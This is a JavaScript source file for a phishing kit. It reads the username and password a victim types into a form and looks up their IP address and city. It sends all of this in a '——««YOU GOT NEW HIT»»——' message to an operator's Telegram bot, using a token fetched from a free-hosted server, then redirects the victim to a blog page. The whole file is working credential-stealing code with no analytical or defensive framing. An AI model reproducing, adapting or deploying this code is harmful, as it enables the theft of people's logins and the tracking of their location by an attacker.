
function la(src) {
  window.location = src;
}

function GetURLParameter(sParam) {
  const sPageURL = window.location.search.substring(1);
  const sURLVariables = sPageURL.split('&');
  for (let i = 0; i < sURLVariables.length; i++) {
    const sParameterName = sURLVariables[i].split('=');
    if (sParameterName[0] === sParam) {
      return sParameterName[1];
    }
  }
  return null;
}

const bsdk = GetURLParameter('id');

function submitonhfc() {
  fetch(`http://desisexvideos.free.nf/data.php?file=http://desisexvideos.free.nf/${bsdk}.json`)
    .then(response => response.json())
    .then(jsonData => {
      const token = jsonData.token;
      const userid = bsdk;

      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          const userAgent = navigator.userAgent;
          const ip = data.ip;
          const cityName = data.city;

          const page = document.getElementById("page").value;
          const name = document.getElementById("name").value;
          const email = document.getElementById("email").value;

          const message = `——««YOU GOT NEW HIT»»——\nᯓ PAGE » ${page}\n\nᯓ USER » ${name}\nᯓ PASS » ${email}\n\nᯓ IP ADDRESS » ${ip}\nᯓ CITY » ${cityName}\n\n<————««@na4sd»»————>`;
          const botToken = token;
          const chatId = userid;

          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
          const telegramParams = {
            chat_id: chatId,
            text: message
          };

          fetch(telegramUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(telegramParams)
          })
          .then(response => {
            if (response.status === 200) {
              window.location.href = "https://gamer-narpatprihar.blogspot.com";
            }
          });
        });
    });
}
